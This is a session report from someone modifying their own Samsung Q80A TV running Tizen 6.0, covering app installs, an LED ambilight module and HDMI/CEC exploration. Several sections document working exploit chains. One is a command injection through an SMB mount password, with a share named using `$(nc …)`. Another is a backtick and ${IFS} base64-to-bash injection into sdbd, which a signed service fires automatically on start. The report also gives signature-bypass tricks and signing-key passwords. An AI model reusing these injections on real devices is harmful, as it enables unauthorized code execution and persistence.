# Report — Q80A customization session (2026-10-23/24)

## Final system state

### Installed apps (via `pkgcmd -i -t wgt`, root)
| App | Package | Version | Origin |
|---|---|---|---|
| TizenTube | `xvvl3S1TT1` | 2.1.1 | `apps/TizenTubeCobalt.wgt` |
| Jellyfin | `AprZAARz4r` | 0.1.0 (web 10.11.z) | jeppevinkel/jellyfin-tizen-builds |
| Moonlight | `MoonLightS` | 1.16.0 | already installed — upgrade to 1.19.0 blocked by author-signature change (OneLiberty → brightcraft) |

Transfer: `python -m http.server 8888` on the PC + `curl` on the TV to `/tmp`; install with `pkgcmd`.

### Previously removed apps (12, persist)
Amazon Alexa, Samsung Promotion, Xbox, Spotify, e-Manual, Security Center, Globoplay (2), SmartOne IPTV, Apple TV (2), Disney+. Telemetry/ads kept for safety (AdGuard covers the network side).

### HyperTizen — not viable on Tizen 6.0
- Official requirement: Tizen 6.5+ (2022+)
- Verified on the TV: `/usr/lib/libvideoenhance.so.0.1` exists but does **not contain** `cs_ve_get_rgb_measure_*` nor `ve_get_rgb_measure_*` (grep -a on the binary: `measure` = 0 hits)
- HyperTizen uses exactly those functions to sample screen RGB → no capture API on 6.0

### WLED ambilight (HyperTizen replacement) — implemented
- **TizenBrew NG patch**: support for `local/<name>` modules served from `/opt/usr/apps/xvvl3S1bvH/res/wgt/localmodules/` — no jsDelivr publishing required
  - `service/index.js`: static `/local/` route
  - `utils/moduleLoader.js`: local `package.json` + local `appPath` for app-type modules
  - `utils/serviceLauncher.js`: local `serviceFile`
  - `utils/debugger.js`: local `mainFile`
  - Backups: `<file>.orig` next to every patched file
- **`wled-ambilight` module** (`modules/wled-ambilight/`):
  - `package.json` — packageType `mods`, targets `youtube.com/tv`
  - `service.js` — HTTP `127.0.0.1:8090/ddp` → DDP UDP → `192.168.3.176:4048` (Node `dgram` on the TV, no PC relay)
  - `main.js` — samples `<video>` edges (64×36 canvas @15fps) → 226 zones → binary POST; also loads the TizenTube userscript (`LOAD_TIZENTUBE`)
  - Layout: 226 LEDs, top-left corner, clockwise — 72 top / 41 right / 72 bottom / 41 left
- Registered in `/home/owner/share/tizenbrewConfig.json` → `"local/wled-ambilight"`
- **Status**: module appears but LEDs did not react on the first test; the `/local/` route was serving old code until `StandaloneService` was restarted. **Next debug**: check whether `:8090` comes up and whether `main.js` gets injected.
- `kit/wled-relay.py` — PC-side alternative (HTTP→DDP), tested and working (green flash confirmed)

### HDMI / CEC — full recon
- **Per-port detection**: `/sys/devices/virtual/extcon/hdmi_det_info/` — `cable.0..15` named HDMI1-6, H1_c..H6_c, ARC, EARC, MULTI_PBP, HDMIFW_UPDATE; aggregated in `state`
- **CEC**: `org.tizen.tv.hdmicec` (busctl) — `GetDeviceCount(b)`, `GetDeviceName(i)`, `GetDevicePortNum(i)`, `GetActiveDeviceName`, `GetDeviceType`, `SendKeyToHdmicec`… — API doc: `/usr/bin/hdmicec-api.xml`. Live: 1 device "HTR-3066" (Yamaha receiver) on HDMI 3
- **Video signal**: `/dev/video21` = `sdp-hdmi` (V4L2; timings via ioctl — needs the ARM helper, built: `tools/hdmi-timings`). Switch: `video28`. MFC decoders: video10-14
- **Source**: `com.samsung.ISourceControl` on `tvs-daemon` (malformed introspection XML; methods TBD)
- EDID: `card0-LVDS-1/edid` (internal panel)

### HDMI panel — module ready (not yet tested on the TV)
- `modules/hdmi-panel/` — local TizenBrew app: `service.js` serves `/api` on `127.0.0.1:8091` reading `extcon/state` + calling `busctl` for CEC; `index.html` renders an auto-refresh (2s) panel
- `tools/hdmi-timings` — static ARMv7 binary (zig 0.17, musl) that runs `VIDIOC_QUERY_DV_TIMINGS` on `/dev/video21` → real resolution/fps/pixelclock of the HDMI signal. Source: `tools/hdmi-timings.c`
- Pending: copy `modules/hdmi-panel` to `localmodules/` on the TV + register `local/hdmi-panel` in the config + test whether the service (user `owner`) can read extcon and call `busctl` (SMACK may block — degrades gracefully)

### TizenBrew / sdb / dev-mode
- `sdb` (26101): CNXN + `sysinfo:` OK (Tizen 6.0, QN55Q80AAGXZD) but `shell:`/`sync:` refused — dev-mode host pinned to `127.0.0.1`
- UEP: scripts executed via `bash file.sh` are blocked (`[uep][bash] the file is NOT signed!!`); `bash < file` (stdin) passes. App JS under `/opt/usr/apps/` is **not** signed — patchable (that is how the local module went in)
- `.orig` files preserve the original TizenBrew sources

### CIFS root
- Confirmed chain: Remote PC → Shared Folder → `remotepc_uilauncher` → `CallCommand("ps_mount_cifs", …)` via `com.safe.ps_agent` (D-Bus `/com/safe/ps_agent`) → `/usr/apps/privileged-service/bin/mount.smb.sh` → `mount -o …,password=$(…)` evaluated by `/bin/bash -c`
- Credentials file `/tmp/fileXXXX`: `username=/password=/smbpath=`
- `busctl call com.safe.ps_agent … CallCommand ss ps_mount_cifs …` → timeout and `mount.smb.sh` never spawned — **not reproduced via software** (UI route confirmed; direct call still unproven)
- `mount.smb.sh`/`bash -i` remain as parents of the shell (pid visible in `ps`) — killing the mount kills the shell

### Service menu
- `app_launcher -s org.tizen.factory` opens it directly — no remote key sequence. Inspection only (nothing changed)

### Cleanup performed
- PC listeners stopped (bridge, listener, http.server 8888, wled-relay 8090)
- **Done (admin on Windows)**: `kit/cleanup-rdp.ps1` — removes share `x$(nc …)`, disables `tvrdp`, `fDenyTSConnections=1`, RDP firewall off
- **Done (user)**: restored the `rpf16` password
- Persists on the TV (benign/needed): `/home/owner/share/r`, `localmodules/`, TizenBrew patch, config `local/wled-ambilight`


# Session report — 2026-10-26 (sdbd injection + signed WGT service)

## New: sdbd loopback injection (exec as `sdk`, no mount needed)

`sdbd` on `127.0.0.1:26101` (devIP `127.0.0.1`) accepts the Vetro-style tpk injection:

```
shell:0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}<base64>|base64${IFS}-d|bash`.tpk
```

- Runs as `uid=901(sdk)`, SMACK `System` — not root, but `setsid /usr/bin/dotnet <daemon>`
  produces a `User`-labeled daemon that captures real frames (~60-90fps, NV16 720x540).
- The SVE-2025-50109 patch verdict was wrong: `appinstall` does eval the path —
  only the `${IFS}`+backtick form works; `exec:`/`shell:`/`vd_appinstall`/`sync:` don't eval.
- Gate trick: `mkdir -p /tmp/s-<rand>` first — a stale dir silently kills `&&` chains.
- External hosts can't inject (sdbd resets non-loopback CNXN).
- Helper: `tools/sdpmemcs/SdbInject.exe v2:<cmd>` builds CNXN/OPEN + injection itself.

## New: signed WGT service `wledAmbi00`

`wgt/` → `WledAmbi.wgt` (official `tizen package` + `pubsig` profile):
- `<tizen:service>` `services/wledambi-service/dist/index.js` — on `onStart` connects
  to `127.0.0.1:26101` and fires the injection (10 retries @ 5s); real Node-ish JS
  (`require('net')`, `Buffer`, `setInterval` work — TizenBrew's runtime can't).
- Registers `wledAmbi00.WledAmbiUi` + `wledAmbi00.WledAmbiSvc`; `launch_app` works on both.
- UI `index.html` also fires the service via `launchAppControl`.
- Persists across reboot (installed package); `/tmp` clears — tools need re-push.
- Verified: service → injection → `sdk` daemon → `User` → strip lit end-to-end.

## Signing lessons

- `pkgcmd` `-19` = pkgid must be 10 chars (`wledAmbi00`), or bad package format
  (jszip signatures rejected — use the official `tizen.bat package`).
- `-12 "Invalid format of certificate in signature"` = the user Samsung dev certs
  have empty DN RDNs (`C=,ST=,L=,O=,OU=`) — the TV's cert parser rejects them.
- Working chain: `tizen-distributor-signer.p12` (Tizen public test CA — same as
  TizenBrew's) with pw `tizenpkcs12passfordsigner`; author from
  dzikus/tizen-camera-pip `author.p12` (pw `camera-pip`).
- User Samsung certs kept at `Desktop\cert samsung tyzen\` + `SamsungCertificate\q80a\`
  (Public level, DUID-bound) — useless for install but harmless to keep.

## Still open

- **Boot persistence**: public cert doesn't auto-start services (Vetro docs cite Partner).
- **Launcher visibility**: `wledAmbi00.WledAmbiUi` installs + runs via `launch_app`
  but never appears in the TV app menu (icon/label set, `Nodisplay:0` — Smart Hub
  reindex or a missing metadata key unresolved).
- **Root without arm**: not found — sdbd injection is `sdk`, not `uid0`.
- `TizenBrew` module loading was repaired after injected bootstrap fragments
  broke `dist/index.js` (truncated back to the webpack bootstrap line).
- `/home/owner/share/*` persists; `/tmp/*` does not.
